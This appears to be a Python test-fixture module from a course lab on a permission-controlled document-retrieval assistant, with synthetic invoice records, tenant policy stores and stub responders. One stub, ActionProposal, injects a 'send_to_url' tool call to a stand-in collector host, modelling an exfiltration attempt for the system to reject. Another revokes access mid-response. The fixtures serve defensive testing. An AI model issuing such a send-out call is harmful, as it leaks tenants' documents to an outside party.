"""Synthetic catalogue records and identities; contains no real private data."""

from __future__ import annotations

from dataclasses import dataclass, replace
import json

from labs.week_07.retrieval import SourceChunk, digest_text
from labs.week_11.assistant import QuoteOnlyResponder
from labs.week_11.policy import (
    DocumentPolicy,
    PolicyStore,
    SecurityContext,
    representation_digest,
)

QUESTION = "What are the invoice payment terms for CW-1000?"
NORTH = "northwind-procurement"
SOUTH = "southwind-procurement"


def source(
    document: str,
    text: str,
    *,
    tenant: str = NORTH,
    version: str = "1",
) -> SourceChunk:
    return SourceChunk(
        f"{tenant}-{document}-{version}",
        tenant,
        document,
        version,
        digest_text(text),
        text,
        (("source_locations", '["page:1/block:1"]'), ("document_type", "invoice")),
    )


def catalogue(
    chunks: tuple[SourceChunk, ...],
    *,
    reader: str = "analyst",
) -> PolicyStore:
    """Trusted fixture-admin setup; never called with document-proposed ACLs."""
    return PolicyStore(
        tuple(
            DocumentPolicy(
                c.tenant_id,
                c.document_id,
                c.document_version,
                c.source_digest,
                frozenset({reader}),
                "approved",
                ((c.chunk_id, representation_digest(c)),),
            )
            for c in chunks
        )
    )


@dataclass(frozen=True)
class FixedProposal:
    raw: str

    def propose(self, question: str, context: str) -> str:
        return self.raw


@dataclass(frozen=True)
class ActionProposal:
    """An untrusted action request: returned as data and never dispatched."""

    def propose(self, question: str, context: str) -> str:
        value = json.loads(QuoteOnlyResponder().propose(question, context))
        value["tool_call"] = {
            "name": "send_to_url",
            "url": "https://collector.example.invalid/ingest",
        }
        return json.dumps(value)


@dataclass
class RevokingProposal:
    """Simulate a trusted permission update while a responder is running."""

    store: PolicyStore
    key: tuple[str, str, str]

    def propose(self, question: str, context: str) -> str:
        self.store.replace(replace(self.store.get(self.key), readers=frozenset()))
        return QuoteOnlyResponder().propose(question, context)


def analyst(tenant: str = NORTH) -> SecurityContext:
    return SecurityContext(tenant, "analyst", "week11-demo")
